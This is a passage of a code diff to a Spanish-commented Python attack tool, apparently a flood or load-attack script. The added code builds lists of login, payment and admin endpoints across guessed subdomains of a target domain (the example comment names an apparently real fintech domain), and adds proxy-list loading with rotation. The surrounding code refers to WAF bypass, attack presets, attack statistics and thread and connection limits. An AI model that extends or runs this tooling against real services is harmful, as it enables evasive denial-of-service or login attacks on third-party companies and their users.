+    Genera múltiples variaciones de endpoints basándose en el dominio base.
+    SIGUIENDO LÓGICA DEL SCRIPT EXITOSO: múltiples subdominios + endpoints críticos.
+    """
+    global TARGET_VARIATIONS
+    
+    if base_target is None:
+        base_target = TARGET
+    
+    variations = []
+    
+    try:
+        from urllib.parse import urlparse
+        
+        parsed = urlparse(base_target if "://" in base_target else f"http://{base_target}")
+        domain = parsed.hostname or DOMAIN
+        protocol = parsed.scheme or PROTOCOL
+        port = parsed.port or PORT
+        
+        if not domain:
+            return []
+        
+        # Extraer dominio base (sin subdominio)
+        domain_parts = domain.split('.')
+        if len(domain_parts) >= 2:
+            base_domain = '.'.join(domain_parts[-2:])  # ej: cumplo.com
+        else:
+            base_domain = domain
+        
+        # Subdominios comunes a probar (como el script exitoso)
+        common_subdomains = [
+            "backoffice-api",
+            "api-global", 
+            "staging",
+            "tesoreria-mx",
+            "api",
+            "www",
+            "app",
+            "admin",
+            "dashboard",
+            "backend",
+            "api-v1",
+            "api-v2",
+            "v1",
+            "v2",
+            "test",
+            "dev",
+            "prod",
+            "production"
+        ]
+        
+        # Endpoints críticos comunes (como el script usa /auth/login)
+        critical_endpoints = [
+            "/auth/login",
+            "/api/auth/login",
+            "/login",
+            "/api/login",
+            "/api/",
+            "/v1/",
+            "/v2/",
+            "/graphql",
+            "/api/v1/",
+            "/api/v2/",
+            "/checkout",
+            "/payment",
+            "/api/payment",
+            "/admin",
+            "/dashboard",
+            "/",
+            "/api/health",
+            "/health"
+        ]
+        
+        # Generar variaciones: subdominio + endpoint
+        for subdomain in common_subdomains:
+            for endpoint in critical_endpoints:
+                # Construir URL completa
+                if port and port not in [80, 443]:
+                    url = f"{protocol}://{subdomain}.{base_domain}:{port}{endpoint}"
+                else:
+                    url = f"{protocol}://{subdomain}.{base_domain}{endpoint}"
+                variations.append(url)
+        
+        # También agregar el dominio base con cada endpoint
+        for endpoint in critical_endpoints:
+            if port and port not in [80, 443]:
+                url = f"{protocol}://{base_domain}:{port}{endpoint}"
+            else:
+                url = f"{protocol}://{base_domain}{endpoint}"
+            if url not in variations:
+                variations.append(url)
+        
+        # Limitar a las primeras 50 variaciones para no saturar
+        variations = variations[:50]
+        
+        log_message("INFO", f"🔀 [TARGET-VARIATIONS] Generadas {len(variations)} variaciones de endpoints", context="generate_target_variations", force_console=True)
+        
+        return variations
+        
+    except Exception as e:
+        log_message("ERROR", f"Error generando variaciones de target: {e}", context="generate_target_variations")
+        return []
+
 def prioritize_endpoints(fingerprint: Dict = None) -> List[str]:
     """Identifica y prioriza endpoints críticos basado en fingerprint"""
+    global TARGET_VARIATIONS
+    
     prioritized = []
     
     try:
+        # Generar variaciones automáticamente desde el dominio base
+        if not TARGET_VARIATIONS:
+            variations = generate_target_variations_from_domain()
+            if variations:
+                TARGET_VARIATIONS = variations
+                log_message("INFO", f"✅ [ENDPOINTS] {len(variations)} variaciones generadas automáticamente", context="prioritize_endpoints", force_console=True)
+        
         # Endpoints descubiertos durante fingerprint
         discovered_endpoints = fingerprint.get("discovered_endpoints", []) if fingerprint else []
         
@@ -8369,9 +8952,22 @@ def prioritize_endpoints(fingerprint: Dict = None) -> List[str]:
                     prioritized.append(url)
                     break
         
+        # Agregar variaciones generadas
+        if TARGET_VARIATIONS:
+            prioritized.extend(TARGET_VARIATIONS[:20])  # Limitar a 20 para no saturar
+        
         # Si no hay endpoints descubiertos, usar el target principal
         if not prioritized:
             prioritized = [TARGET]
+        
+        # Eliminar duplicados manteniendo orden
+        seen = set()
+        unique_prioritized = []
+        for url in prioritized:
+            if url not in seen:
+                seen.add(url)
+                unique_prioritized.append(url)
+        prioritized = unique_prioritized
         
         # Guardar en attack_stats
         attack_stats["prioritized_endpoints"] = prioritized
@@ -12299,6 +12895,9 @@ Ejemplos:
     parser.add_argument("--list-templates", action="store_true", help="Listar templates disponibles")
     parser.add_argument("--api", action="store_true", help="Iniciar API REST")
     parser.add_argument("--api-port", type=int, default=8080, help="Puerto para API REST (default: 8080)")
+    parser.add_argument("--proxy-file", type=str, help="Archivo con lista de proxies (formato: IP:PORT, uno por línea)")
+    parser.add_argument("--proxy-list", type=str, help="Lista de proxies como string (formato: IP:PORT\\nIP:PORT)")
+    parser.add_argument("--proxy-rotation", type=str, choices=['round-robin', 'random'], default='round-robin', help="Estrategia de rotación de proxies (default: round-robin)")
     
     args = parser.parse_args()
     
@@ -12394,6 +12993,25 @@ Ejemplos:
     # Aplicar preset si se especifica
     if args.preset:
         apply_attack_preset(args.preset)
+    
+    # Cargar proxies si se proporcionan - SIGUIENDO LÓGICA DEL SCRIPT EXITOSO
+    if args.proxy_file:
+        proxies_loaded = load_proxy_list(proxy_file=args.proxy_file)
+        if proxies_loaded:
+            print_color(f"✅ {len(proxies_loaded)} proxy(s) cargado(s) desde archivo: {args.proxy_file}", Colors.GREEN, True)
+        else:
+            print_color(f"⚠️ No se pudieron cargar proxies desde: {args.proxy_file}", Colors.YELLOW, True)
+    elif args.proxy_list:
+        proxies_loaded = load_proxy_list(proxy_string=args.proxy_list)
+        if proxies_loaded:
+            print_color(f"✅ {len(proxies_loaded)} proxy(s) cargado(s) desde string", Colors.GREEN, True)
+        else:
+            print_color(f"⚠️ No se pudieron cargar proxies desde string", Colors.YELLOW, True)
+    
+    # Configurar estrategia de rotación de proxies
+    if args.proxy_rotation:
+        PROXY_ROTATION = args.proxy_rotation
+        loadtest.PROXY_ROTATION = args.proxy_rotation
     
     # Configurar variables globales
     TARGET = args.target
@@ -12500,6 +13118,8 @@ Ejemplos:
     print_color(f"Max Connections: {MAX_CONNECTIONS}", Colors.WHITE)
     print_color(f"Max Threads: {MAX_THREADS}", Colors.WHITE)
     print_color(f"WAF Bypass: {'Activado' if WAF_BYPASS else 'Desactivado'}", Colors.WHITE)
+    if PROXY_LIST:
+        print_color(f"Proxies cargados: {len(PROXY_LIST)} ({PROXY_ROTATION})", Colors.GREEN)
     if DISCOVERED_ENDPOINTS:
         print_color(f"Endpoints descubiertos: {len(DISCOVERED_ENDPOINTS)}", Colors.GREEN)
     print_color("="*80 + "\n", Colors.CYAN)
